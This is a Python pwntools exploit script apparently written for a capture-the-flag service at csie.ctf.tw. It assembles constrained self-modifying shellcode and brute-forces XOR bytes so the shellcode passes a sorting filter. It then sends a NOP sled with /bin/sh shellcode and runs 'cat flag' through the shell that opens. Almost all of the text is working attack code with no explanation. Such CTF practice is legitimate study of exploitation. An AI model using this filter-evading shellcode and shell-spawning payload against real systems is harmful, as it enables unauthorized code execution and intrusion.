from pwn import *

context.arch = 'amd64'

r = remote('csie.ctf.tw', 10121)

#payload = '''
#popf
#popf
#popf
#popf
#popf
#popf
#popf
#popf
#nop
#nop
#push 0x5e52535a
#push rdx
#push rdx //push to here -> pop rsi
#push rdx //also
#push rdx //also
#push rdx //also
#push rdx //0x00 QQ
#push rdx //0x00 QQ
#push rdx //0x00 QQ
#push rdx //0x00 QQ
#syscall
#'''

payload = 'mov bl, 0xb3\n'*53

payload += '''
// target 53 52 5e 5a
// target 52 53 5a 5e
// target 52 5e 53 5a
// target 53 5a 52 5e -> not allow because rdx will be overwritten
// 53: push rbx
// 52: push rdx
// 5e: pop rsi
// 5a: pop rdx
nop
syscall
xor dword ptr [rdx+0x72], 0x87878787
'''

shellcode = asm(payload)[:-4]

possible = [
        [0x53,0x52,0x5e,0x5a],
        [0x52,0x53,0x5a,0x5e],
        [0x52,0x5e,0x53,0x5a]
        ]
found = 0
for a in range(int('0x10',16), int('0x72', 16)):
    for b in range(int('0x10',16), a):
        for c in range(int('0x10',16), b):
            for d in range(int('0x10',16), c):
                for i in possible:
                    e = a^i[0]
                    f = b^i[1]
                    g = c^i[2]
                    h = d^i[3]
                    if d > e and e > f and f > g and g > h: # following the fucking sorting rule
                        print(hex(a), hex(b), hex(c), hex(d), hex(e), hex(f), hex(g), hex(h))
                        print(hex(i[0]), hex(i[1]), hex(i[2]), hex(i[3]))
                        shellcode += chr(a)
                        shellcode += chr(b)
                        shellcode += chr(c)
                        shellcode += chr(d)
                        shellcode += chr(e)
                        shellcode += chr(f)
                        shellcode += chr(g)
                        shellcode += chr(h)
                        found = 1
                    if found == 1:
                        break
                if found == 1:
                    break
            if found == 1:
                break
        if found == 1:
            break
    if found == 1:
        break

r.send(shellcode)
r.send("\x90"*120 + asm(shellcraft.amd64.linux.sh()))
#r.interactive()
r.sendline('cat flag')
print(r.recvline())
r.close()
